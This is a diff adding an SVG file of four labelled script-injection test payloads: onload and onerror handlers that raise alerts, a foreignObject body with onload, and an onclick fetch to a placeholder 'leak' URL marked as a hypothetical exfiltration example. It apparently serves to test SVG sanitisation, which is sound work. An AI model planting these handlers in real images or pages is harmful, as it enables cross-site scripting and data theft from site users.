@@ -1,0 +1,17 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <!-- Payload 1: JavaScript execution via onload -->
+  <rect width="100%" height="100%" fill="blue" onload="alert('Payload 1 executed');" />
+  
+  <!-- Payload 2: External resource -->
+  <image href="http://example.com/nonexistent.png" width="100" height="100" onerror="alert('Payload 2 executed');" />
+
+  <!-- Payload 3: Malicious use of <foreignObject> -->
+  <foreignObject width="100" height="100">
+    <body xmlns="http://www.w3.org/1999/xhtml" onload="alert('Payload 3 executed');">
+      <p>This is a test of <foreignObject>.</p>
+    </body>
+  </foreignObject>
+
+  <!-- Payload 4: Data exfiltration (hypothetical example for controlled environments) -->
+  <text x="10" y="50" fill="red" onclick="fetch('http://example.com/leak?data=Test');">Click Me</text>
+</svg>
